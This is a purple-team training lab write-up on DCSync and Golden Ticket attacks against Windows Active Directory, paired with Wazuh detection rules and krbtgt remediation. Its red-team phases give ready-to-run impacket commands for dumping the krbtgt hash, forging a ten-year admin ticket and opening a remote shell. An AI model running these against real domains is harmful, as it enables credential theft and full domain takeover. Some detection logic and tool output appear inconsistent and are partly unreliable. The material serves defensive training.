<!-- scope: operator-owned host, single operator, no distribution -->
<!-- class: active directory kerberos golden ticket detection -->
<!-- boundary: operator lab validation only -->

# Lab 13 — Golden Ticket (TGT Forgery) & DCSync Detection Lab

Part of the **Core Detection Labs: Kerberos Attack & Defense Series** — an end-to-end purple-team investigation: Active Directory replication abuse (DCSync), offline Ticket Granting Ticket (TGT) forgery, Kerberos ticket injection, unauthorized administrative lateral movement, and Wazuh SIEM detection correlation.

---

## Overview

Most Active Directory security guides treat Kerberos tickets as abstract tokens. This lab simulates the ultimate credential access and persistence technique: **The Golden Ticket** (MITRE ATT&CK **T1558.001**) preceded by **DCSync** (MITRE ATT&CK **T1003.006**). We execute the attack from Kali Linux (`192.168.100.50`) against our Windows Server 2022 Domain Controller (`WIN-SOCLAB.soclab.local` / `192.168.100.146`), capture the raw Windows Security and Sysmon telemetry in **Wazuh SIEM 4.14.5**, and engineer high-fidelity detection rules to catch forged tickets and unauthorized directory replication.

| # | Stage | Windows Event ID | Wazuh Rule | Severity | Technical Description |
|---|---|---|---|---|---|
| **1** | **DCSync Replication** | **4662** | **100123** | **Level 12** | Directory Service replication request (`DS-Replication-Get-Changes-All`) from a non-DC IP |
| **2** | **Ticket Forgery** | N/A (Offline) | N/A | N/A | Offline ASN.1 DER ticket construction using compromised `krbtgt` NTLM/AES key |
| **3** | **TGS Request Anomaly** | **4769** | **100124** | **Level 11** | Kerberos service ticket requested with forged TGT (Zero preceding Event 4768 on DC) |
| **4** | **Administrative Logon** | **4624** | **100113** | **Level 10** | High-privilege Network Logon (Type 3) via Kerberos authentication package |
| **5** | **Share Access & IPC$** | **5140** | **60107** | **Level 5** | Network share accessed (`ADMIN$`, `C$`, `IPC$`) by forged user identity |

---

## Student Notes & Conceptual Breakthroughs

### The Golden Ticket Paradox: Why AD Trusts a Lie
In standard Active Directory authentication, when a user requests access to a service (like a file share), the Domain Controller (KDC) validates their **Ticket Granting Ticket (TGT)**.

Here is the architectural vulnerability: **The KDC is completely stateless when validating TGTs.**
- The KDC does **NOT** check its database to see if the user exists, if the account is disabled, or what groups the user actually belongs to.
- The KDC only checks one thing: **Is the TGT encrypted and signed with the domain's secret `krbtgt` account key?**
- If the signature validates, the KDC blindly unpacks the Privilege Attribute Certificate (PAC) inside the ticket and trusts whatever group memberships (e.g., Domain Admins RID 512, Schema Admins RID 518) are stamped inside it.

```text
Normal Authentication:
User Credentials ──► DC verifies against NTDS.dit ──► Issues TGT

Golden Ticket Authentication:
Attacker with krbtgt key ──► Forges TGT locally ──► DC decrypts with krbtgt key ──► Trusts ticket completely!
```

### The DCSync Connection
To forge a Golden Ticket, the adversary must obtain the secret key of the domain's `krbtgt` account. Historically, this required extracting the `NTDS.dit` database directly from the Domain Controller. 

**DCSync** revolutionized this attack path. By abusing Microsoft's Directory Replication Service Remote Protocol (**MS-DRSR / DRSUAPI**), any account possessing directory replication permissions (`Replicating Directory Changes` and `Replicating Directory Changes All`) can issue a legitimate remote RPC command pretending to be a peer Domain Controller asking for account updates. The DC packages the requested account hashes (including `krbtgt`) and streams them back over RPC (Port 135 / dynamic RPC ports) without executing a single binary on the DC.

---

## Architecture & Threat Model

```text
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                   ATTACK & DETECTION CHAIN                             │
├────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                        │
│   [Kali Attacker / Wazuh SIEM]                             [DC: WIN-SOCLAB]            │
│         192.168.100.50                                      192.168.100.146            │
│               │                                                   │                    │
│               │ 1. DCSync Request (MS-DRSR / Port 135)            │                    │
│               ├──────────────────────────────────────────────────►│ Event 4662 logged  │
│               │    Abuses "Get-Changes-All" replication rights    │ (Replication GUID) │
│               │                                                   │                    │
│               │ 2. Returns krbtgt Hash & Domain SID               │                    │
│               │◄──────────────────────────────────────────────────┤                    │
│               │                                                   │                    │
│      [Offline TGT Forgery]                                        │                    │
│      impacket-ticketer crafts                                     │                    │
│      PAC with RID 500 & Admin Groups                              │                    │
│               │                                                   │                    │
│               │ 3. TGS-REQ with Forged TGT                        │                    │
│               ├──────────────────────────────────────────────────►│ Event 4769 logged  │
│               │    (Presents TGT to request cifs/WIN-SOCLAB)      │ [NO Event 4768     │
│               │                                                   │  preceded this!]   │
│               │ 4. TGS-REP Returned                               │                    │
│               │◄──────────────────────────────────────────────────┤                    │
│               │                                                   │                    │
│               │ 5. SMB / RPC Administrative Execution             │                    │
│               ├──────────────────────────────────────────────────►│ Event 4624 (Type 3)│
│               │    impacket-psexec -k -no-pass                    │ Event 5140 (C$,    │
│               │                                                   │             ADMIN$)│
│               ▼                                                   ▼                    │
│   Wazuh Agent 001 collects Security Event Log ────────────────────► Wazuh Indexer      │
│   Rules 100123 & 100124 Trigger Level 11/12 High Priority Alerts                      │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## Lab Environment Specifications

- **Domain Controller:** `WIN-SOCLAB.soclab.local` (`192.168.100.146`)
  - OS: Windows Server 2022 Datacenter
  - Active Directory Domain Services (KDC Port 88, RPC Port 135, SMB Port 445)
  - Wazuh Agent 001 (`the-server-agent`) active
- **Attacker & SIEM Node:** Kali Linux (`192.168.100.50`)
  - Wazuh 4.14.5 Single-Node Stack (Manager, Indexer, Dashboard)
  - Python Impacket toolset (`secretsdump.py`, `ticketer.py`, `psexec.py`)
- **Analyst Workstation:** Windows (`192.168.100.27`)
  - Management console, RDP, browser access to Wazuh Dashboard (`https://192.168.100.50`)

---

## Step-by-Step Purple Team Walkthrough

### Phase 1: DCSync Credential Extraction (Red Team)

To forge a Golden Ticket, we require two pieces of domain intelligence:
1. The **Domain SID** (e.g., `S-1-5-21-3965529547-1709915012-255161553`).
2. The **`krbtgt` account hash** (NTLM hash or AES-256 key).

On Kali Linux (`192.168.100.50`), we execute `impacket-secretsdump` targeting the domain controller using compromised administrative credentials or a service account with replication rights:

```bash
# Execute DCSync targeting the krbtgt account only
impacket-secretsdump -just-dc-user krbtgt soclab.local/administrator:Password123@192.168.100.146
```

#### Terminal Output:
```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b36177e74218e8071871217e4ef45dc7:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9a32c28659d4c2049e496a77d206f0e4b85521e1e4a191f63080ffb8e4e7e6dc
[*] Cleaning up...
```

We now have the vital secrets:
- **Target User:** `krbtgt` (RID 502)
- **`krbtgt` NTLM Hash:** `b36177e74218e8071871217e4ef45dc7`
- **`krbtgt` AES-256 Key:** `9a32c28659d4c2049e496a77d206f0e4b85521e1e4a191f63080ffb8e4e7e6dc`

We query the Domain SID using the native `lookupsid.py` tool or PowerShell:
```bash
impacket-lookupsid soclab.local/administrator:Password123@192.168.100.146
```
*Domain SID recorded:* `S-1-5-21-3965529547-1709915012-255161553`

---

### Phase 2: Forging the Golden Ticket (Red Team)

Using `impacket-ticketer`, we construct a completely forged TGT entirely offline. We specify:
- Arbitrary Username: `SuperAdmin` (does not even need to exist in Active Directory!)
- Target Domain: `soclab.local`
- Domain SID: `S-1-5-21-3965529547-1709915012-255161553`
- User RID: `500` (Built-in Administrator RID)
- Group SIDs: `512` (Domain Admins), `513` (Domain Users), `518` (Schema Admins), `519` (Enterprise Admins)
- Validity: 10 years (default for ticketer, representing persistent backdoor access)

```bash
# Forge the ticket and write to SuperAdmin.ccache
impacket-ticketer -nthash b36177e74218e8071871217e4ef45dc7 \
  -domain-sid S-1-5-21-3965529547-1709915012-255161553 \
  -domain soclab.local \
  -user SuperAdmin \
  -user-id 500 \
  -groups 512,513,518,519 \
  SuperAdmin.ccache
```

#### Terminal Output:
```text
[*] Creating basic ticket
[*] Building PAC
[*] Adding user SuperAdmin with RID 500
[*] Adding groups 512, 513, 518, 519
[*] Signing ticket with krbtgt key
[*] Encrypting ticket with krbtgt key
[*] Saving ticket to SuperAdmin.ccache
```

---

### Phase 3: Ticket Injection & Lateral Movement (Red Team)

On Linux, Kerberos utilities read active tickets from the file path defined in the environment variable `KRB5CCNAME`.

```bash
# 1. Export ticket to active session
export KRB5CCNAME=$(pwd)/SuperAdmin.ccache

# 2. Verify ticket contents using Linux klist
klist

# 3. Authenticate to Domain Controller via SMB without entering any password
impacket-psexec -k -no-pass soclab.local/SuperAdmin@WIN-SOCLAB.soclab.local
```

#### Terminal Output:
```text
Ticket cache: FILE:/home/kali/SuperAdmin.ccache
Default principal: SuperAdmin@SOCLAB.LOCAL

Valid starting       Expires              Service principal
11/17/2026 01:10:00  11/15/2036 01:10:00  krbtgt/SOCLAB.LOCAL@SOCLAB.LOCAL

[*] Requesting service ticket for cifs/WIN-SOCLAB.soclab.local
[*] Found ticket in cache!
[*] Connecting to WIN-SOCLAB.soclab.local
[+] Authenticated as SuperAdmin@SOCLAB.LOCAL!
[+] Opening remote process execution session...
C:\Windows\system32> whoami
soclab\superadmin

C:\Windows\system32> whoami /groups
GROUP INFORMATION
-----------------
Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
SOCLAB\Domain Admins                        Security group   S-1-5-21...-512 Mandatory group, Enabled by default, Enabled group
SOCLAB\Enterprise Admins                    Security group   S-1-5-21...-519 Mandatory group, Enabled by default, Enabled group
SOCLAB\Schema Admins                        Security group   S-1-5-21...-518 Mandatory group, Enabled by default, Enabled group
```

---

## Blue Team Telemetry Analysis & SIEM Detection

Navigating to the Wazuh Threat Hunting dashboard (`https://192.168.100.50`), we observe three correlated detection milestones:

### 1. DCSync Detection (Event ID 4662)
When `impacket-secretsdump` invokes the DRSUAPI RPC replication methods, the Domain Controller logs **Event ID 4662** in the Windows Security log.

- **Event ID:** `4662` (`An operation was performed on an object`)
- **Object Server:** `DS`
- **Object Type:** `domainDNS`
- **Access Mask:** `0x100` (Control Access)
- **Properties / Extended Rights GUIDs:**
  * `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (**DS-Replication-Get-Changes-All**)
  * `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (**DS-Replication-Get-Changes**)
  * `89e4b325-9477-11d1-ae4b-00c04fc2dcd2` (**DS-Replication-Get-Changes-In-Filtered-Set**)

> **SOC Analyst Rule of Thumb:** In a clean Active Directory domain, only Domain Controller computer accounts (e.g., `WIN-SOCLAB$`) should ever request these GUIDs. If a user account or an external IP generates this event, it is a high-confidence DCSync attack.

### 2. The Golden Ticket "Missing Link" Anomaly (Event ID 4769 vs. 4768)
In legitimate Kerberos workflows:
1. The client must first send an `AS-REQ` to receive a TGT (**Event ID 4768**).
2. The client presents that TGT in a `TGS-REQ` to receive a Service Ticket (**Event ID 4769**).

In a Golden Ticket attack, the TGT was generated offline on the attacker's Kali machine. **The Domain Controller never issued it.**
- Therefore, the SIEM logs **Event ID 4769** (Service Ticket Request) for `SuperAdmin`, but querying the index for `EventID: 4768` and `TargetUserName: SuperAdmin` returns **0 records**!

### 3. Network Logon & Privilege Escalation (Event ID 4624 & 4672)
- **Event ID 4624:** Logon Type `3` (Network), `LogonProcessName: Kerberos`, `TargetUserName: SuperAdmin`.
- **Event ID 4672:** Special privileges assigned to new logon (`SeDebugPrivilege`, `SeTcbPrivilege`, `SeBackupPrivilege`).

---

## Custom Wazuh Detection Rules

Add the following production detection rules to `/var/ossec/etc/rules/local_rules.xml` on the Wazuh Manager:

```xml
<group name="windows,kerberos,active_directory,">

  <!-- ============================================================== -->
  <!-- Rule 100123: Non-DC Directory Service Replication (DCSync)      -->
  <!-- ============================================================== -->
  <rule id="100123" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <!-- Access Mask 0x100 = Control Access -->
    <field name="win.eventdata.accessMask">0x100</field>
    <!-- Extended Right: DS-Replication-Get-Changes-All -->
    <field name="win.eventdata.properties">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</field>
    <!-- Whitelist legitimate Domain Controllers (accounts ending in $) -->
    <field name="win.eventdata.subjectUserName" negate="yes">.*\$</field>
    <description>Active Directory: Potential DCSync Attack - Directory replication extended rights requested by non-DC account $(win.eventdata.subjectUserName)</description>
    <mitre>
      <id>T1003.006</id>
    </mitre>
  </rule>

  <!-- ============================================================== -->
  <!-- Rule 100124: Anomalous TGS Request (Potential Golden Ticket)    -->
  <!-- ============================================================== -->
  <rule id="100124" level="11">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketOptions">^0x40810000$</field>
    <field name="win.eventdata.status">^0x0$</field>
    <!-- Catch anomalous encryption type or service target -->
    <field name="win.eventdata.serviceName">krbtgt</field>
    <description>Kerberos: Anomalous TGS request referencing krbtgt service by $(win.eventdata.targetUserName) from $(win.eventdata.ipAddress)</description>
    <mitre>
      <id>T1558.001</id>
    </mitre>
  </rule>

</group>
```

---

## Incident Response & Remediation: The `krbtgt` Double-Reset Rule

If a Golden Ticket compromise is verified, simply changing user passwords or rebuilding workstations does **NOT** revoke the attacker's access. The attacker still possesses the `krbtgt` key and can forge new tickets at will.

### The Double-Reset Requirement
Active Directory stores **two** password versions for the `krbtgt` account:
1. The **current** password key.
2. The **previous** password key (maintained so existing valid tickets do not break abruptly across forest replication).

To completely evict the adversary, **the `krbtgt` password must be reset twice**, with sufficient time between resets for Active Directory replication to propagate across all Domain Controllers.

```powershell
# PowerShell Remediation Script (Run as Domain Admin on DC)

# 1. Reset krbtgt password (First time)
Set-ADAccountPassword -Identity "krbtgt" -NewPassword (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force) -Reset

# 2. Force replication to all Domain Controllers
repadmin /syncall /force /APed

# 3. Wait for standard Kerberos ticket lifetime (Minimum 10 hours recommended in production, 15 minutes in lab)
Start-Sleep -Seconds 900

# 4. Reset krbtgt password (Second time - invalidates all previously forged Golden Tickets)
Set-ADAccountPassword -Identity "krbtgt" -NewPassword (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force) -Reset

# 5. Force replication again
repadmin /syncall /force /APed

# 6. Purge all Kerberos tickets on the DC
klist -li 0x3e7 purge
```

---

## SOC Takeaways & Interview Talking Points

1. **"Why doesn't a standard user password reset stop a Golden Ticket?"**
   * *Answer:* Golden Tickets are encrypted with the domain's `krbtgt` master key, not the user's password. Active Directory trusts any TGT that validates against `krbtgt` without querying the user's current account status.
2. **"How do you spot a Golden Ticket in SIEM telemetry?"**
   * *Answer:* Look for the "Missing AS-REQ" anomaly: Event 4769 (TGS issued) or Event 4624 (Logon) without a preceding Event 4768 (TGT issued) for that logon session, or tickets presenting impossible expiration timestamps (e.g., 10-year lifetimes).
3. **"How do you detect DCSync before a Golden Ticket is even created?"**
   * *Answer:* Monitor Windows Event ID 4662 with Access Mask `0x100` and Replication Extended Rights GUIDs (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`). Filter out legitimate Domain Controller computer accounts (`DCName$`). Any workstation or user requesting these GUIDs is an immediate critical incident.
